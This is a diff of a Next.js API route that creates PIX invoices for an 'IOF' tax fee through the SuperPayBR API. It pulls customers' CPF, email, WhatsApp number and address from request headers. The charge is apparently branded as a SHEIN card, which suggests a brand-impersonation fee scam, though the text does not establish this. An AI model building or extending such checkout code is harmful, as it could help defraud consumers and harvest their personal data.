@@ -2,65 +2,70 @@ import { type NextRequest, NextResponse } from "next/server"
 
 export async function POST(request: NextRequest) {
   try {
-    const body = await request.json()
     console.log("=== CRIANDO FATURA IOF SUPERPAYBR ===")
-    console.log("Dados recebidos:", JSON.stringify(body, null, 2))
 
-    // Obter token de autenticação
+    const body = await request.json()
+    const { amount, type } = body
+
+    // Obter dados dos headers
+    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
+    const userEmail = request.headers.get("x-user-email") || ""
+    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
+    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")
+
+    console.log("📋 Dados da fatura IOF:", {
+      amount,
+      type,
+      cliente: cpfData.nome,
+      email: userEmail,
+    })
+
+    // Primeiro, fazer autenticação
     const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
     const authResult = await authResponse.json()
 
     if (!authResult.success) {
-      console.log("❌ Erro na autenticação:", authResult.error)
-      return NextResponse.json(
-        {
-          success: false,
-          error: "Erro na autenticação SuperPayBR",
-          details: authResult.error,
-        },
-        { status: 401 },
-      )
+      throw new Error("Falha na autenticação SuperPayBR")
     }
 
     const accessToken = authResult.data.access_token
-    console.log("✅ Token de acesso obtido")
 
-    // Preparar payload para fatura IOF
-    const superPayPayload = {
+    // Preparar dados da fatura IOF SuperPayBR
+    const invoiceData = {
       client: {
-        name: body.customer?.name || "Cliente IOF",
-        document: body.customer?.document || "00000000000",
-        email: body.customer?.email || "iof@exemplo.com",
-        phone: body.customer?.phone || "11999999999",
+        name: cpfData.nome || "Cliente SHEIN",
+        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
+        email: userEmail || "cliente@shein.com",
+        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
         address: {
-          street: "Rua do IOF",
-          number: "1",
-          district: "Centro",
-          city: "São Paulo",
-          state: "SP",
-          zipcode: "01000000",
+          street: deliveryAddress.street || "Rua Principal",
+          number: deliveryAddress.number || "123",
+          district: deliveryAddress.neighborhood || "Centro",
+          city: deliveryAddress.city || "São Paulo",
+          state: deliveryAddress.state || "SP",
+          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
           country: "BR",
         },
-        ip: body.customer?.ip || "127.0.0.1",
+        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
       },
       payment: {
-        id: `IOF_${Date.now()}`,
+        id: `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
         type: "3", // PIX
         due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-        referer: `IOF_REF_${Date.now()}`,
+        referer: "SHEIN_IOF",
         installment: "1",
-        order_url: `${request.nextUrl.origin}/upp10/success`,
+        order_url: `${request.nextUrl.origin}/upp10/checkout`,
         store_url: request.nextUrl.origin,
         webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
         discount: 0,
         products: [
           {
-            id: "iof",
-            image: "https://exemplo.com/iof.png",
-            title: "Taxa IOF - Imposto sobre Operações Financeiras",
+            id: "1",
+            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
+            title: "IOF - Imposto sobre Operações Financeiras",
             qnt: "1",
             discount: 0,
-            amount: 1000, // R$ 10,00 em centavos
+            amount: Number.parseFloat(amount),
           },
         ],
       },
@@ -69,62 +74,68 @@ export async function POST(request: NextRequest) {
       },
     }
 
-    console.log("📤 Enviando fatura IOF para SuperPayBR:", JSON.stringify(superPayPayload, null, 2))
+    console.log("🚀 Enviando fatura IOF para SuperPayBR...")
 
-    // Criar fatura na SuperPayBR
-    const invoiceResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
+    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         Authorization: `Bearer ${accessToken}`,
       },
-      body: JSON.stringify(superPayPayload),
+      body: JSON.stringify(invoiceData),
     })
 
-    console.log("📥 Resposta SuperPayBR (IOF):", {
-      status: invoiceResponse.status,
-      statusText: invoiceResponse.statusText,
-      ok: invoiceResponse.ok,
+    console.log("📥 Resposta SuperPayBR IOF:", {
+      status: createResponse.status,
+      statusText: createResponse.statusText,
+      ok: createResponse.ok,
     })
 
-    if (invoiceResponse.ok) {
-      const invoiceData = await invoiceResponse.json()
+    if (createResponse.ok) {
+      const invoiceResult = await createResponse.json()
       console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")
 
-      // Mapear resposta
-      const mappedResponse = {
-        success: true,
-        data: {
-          id: invoiceData.fatura?.id,
-          invoice_id: invoiceData.fatura?.invoice_id,
-          external_id: superPayPayload.payment.id,
-          amount: 1000,
-          status: "pending",
-          pix: {
-            qr_code: invoiceData.fatura?.pix?.image,
-            qr_code_text: invoiceData.fatura?.pix?.payload,
-            expires_at: superPayPayload.payment.due_at,
-          },
-          payment_url: invoiceData.fatura?.externo?.url,
-          created_at: new Date().toISOString(),
-          type: "iof",
+      // Mapear resposta para formato esperado
+      const mappedInvoice = {
+        id: invoiceResult.fatura.id,
+        invoice_id: invoiceResult.fatura.invoice_id,
+        external_id: invoiceData.payment.id,
+        pix: {
+          payload: invoiceResult.fatura.pix.payload,
+          image: invoiceResult.fatura.pix.image,
+          qr_code: invoiceResult.fatura.pix.image,
         },
-        raw_response: invoiceData,
+        status: {
+          code: invoiceResult.fatura.status.code,
+          title: invoiceResult.fatura.status.title,
+          text: invoiceResult.fatura.status.text || "pending",
+        },
+        valores: {
+          bruto: invoiceResult.fatura.valores.bruto,
+          liquido: invoiceResult.fatura.valores.liquido,
+        },
+        vencimento: {
+          dia: invoiceResult.fatura.vencimento.dia,
+        },
+        type: "real",
       }
 
-      console.log("📋 Resposta IOF mapeada:", JSON.stringify(mappedResponse, null, 2))
-      return NextResponse.json(mappedResponse)
+      return NextResponse.json({
+        success: true,
+        data: mappedInvoice,
+        raw_response: invoiceResult,
+      })
     } else {
-      const errorText = await invoiceResponse.text()
-      console.log("❌ Erro ao criar fatura IOF SuperPayBR:", errorText)
+      const errorText = await createResponse.text()
+      console.log("❌ Erro ao criar fatura IOF SuperPayBR:", createResponse.status, errorText)
 
       return NextResponse.json(
         {
           success: false,
-          error: `Erro ao criar fatura IOF SuperPayBR: ${invoiceResponse.status}`,
-          details: errorText,
+          error: `Erro SuperPayBR: ${createResponse.status} - ${errorText}`,
+          fallback: true,
         },
-        { status: invoiceResponse.status },
+        { status: createResponse.status },
       )
     }
   } catch (error) {
@@ -133,6 +144,7 @@ export async function POST(request: NextRequest) {
       {
         success: false,
         error: "Erro interno ao criar fatura IOF SuperPayBR",
+        fallback: true,
       },
       { status: 500 },
     )
